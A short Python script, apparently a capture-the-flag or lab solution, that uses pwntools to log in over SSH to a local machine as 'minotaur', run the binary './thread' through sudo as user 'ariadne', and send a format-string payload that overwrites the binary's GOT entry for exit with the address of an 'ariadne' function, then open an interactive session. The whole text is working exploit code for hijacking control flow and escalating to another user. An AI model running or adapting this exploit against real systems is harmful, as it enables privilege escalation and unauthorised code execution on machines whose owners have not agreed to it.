from pwn import *

shell = ssh('minotaur', 'localhost',keyfile='id_rsa', port=2222)
p = shell.process(['sudo', '-u', 'ariadne','./thread'])

elf = context.binary = ELF('./thread')
#p = process('./thread')

payload = fmtstr_payload(6, {elf.got['exit'] : elf.sym['ariadne']})
log.info(f'fmt payload => {str(payload)}')

p.sendline(payload)

p.interactive()